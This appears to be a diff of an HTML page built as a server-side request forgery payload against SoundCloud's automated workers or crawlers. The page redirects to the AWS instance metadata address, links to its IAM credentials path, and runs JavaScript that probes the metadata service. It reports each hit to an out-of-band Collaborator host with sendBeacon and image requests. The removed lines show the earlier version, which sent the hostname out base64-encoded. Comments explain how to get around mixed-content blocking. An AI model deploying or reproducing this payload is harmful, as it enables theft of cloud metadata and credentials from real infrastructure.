@@ -2,38 +2,42 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Internal Infrastructure Audit</title>
+    <title>Infrastructure Security Validation</title>
     
     <meta http-equiv="refresh" content="0; url=http://169.254.169.254/latest/meta-data/hostname">
 
     <script>
-        // 2. JAVASCRIPT EXFILTRATION: Targets advanced headless browsers
         window.onload = function() {
-            // Your new Collaborator URL
             const oast = "ie0z38xjt8769e7sxsendgn17sdj19py.oastify.com";
-            
-            // Attempting to grab the AWS internal hostname
-            fetch("http://169.254.169.254/latest/meta-data/hostname")
-                .then(response => response.text())
-                .then(data => {
-                    // Send the data back to you Base64 encoded
-                    navigator.sendBeacon("http://" + oast + "/exfil?data=" + btoa(data));
+            const target = "http://169.254.169.254/latest/meta-data/hostname";
+
+            // LAYER 2: PASSIVE IMAGE PROBE (Bypasses 'Mixed Content' block)
+            // Browsers often allow HTTP images on HTTPS pages.
+            // If the worker hits this, the 'onerror' triggers a ping back to you.
+            const img = new Image();
+            img.src = target;
+            img.onerror = function() {
+                navigator.sendBeacon("https://" + oast + "/probe_hit?type=image_onerror");
+            };
+
+            // LAYER 3: ADVANCED FETCH (Targets Headless Browsers)
+            fetch(target, { mode: 'no-cors' })
+                .then(() => {
+                    navigator.sendBeacon("https://" + oast + "/probe_hit?type=fetch_success");
                 })
-                .catch(err => {
-                    // Log the failure to see why it was blocked
-                    const img = new Image();
-                    img.src = "http://" + oast + "/log?status=blocked_or_timeout";
+                .catch((err) => {
+                    // This will ping your OAST even if it's blocked by Mixed Content,
+                    // proving the code at least attempted to run on the worker.
+                    const log = new Image();
+                    log.src = "https://" + oast + "/probe_failed?reason=" + btoa(err.message);
                 });
         };
     </script>
 </head>
 <body>
-    <h1>SoundCloud Infrastructure Security Test</h1>
-    <p>Automated Worker Detected. If redirection fails, follow the internal path:</p>
-    
-    <a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">Internal IAM Credentials</a>
-
+    <h1>SoundCloud Validation Node</h1>
     <hr>
-    <p>Node Trace: <span id="trace">Processing...</span></p>
+    <p>Automated crawler detected. If redirection fails, verify internal path:</p>
+    <a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">Internal Credentials Access</a>
 </body>
 </html>
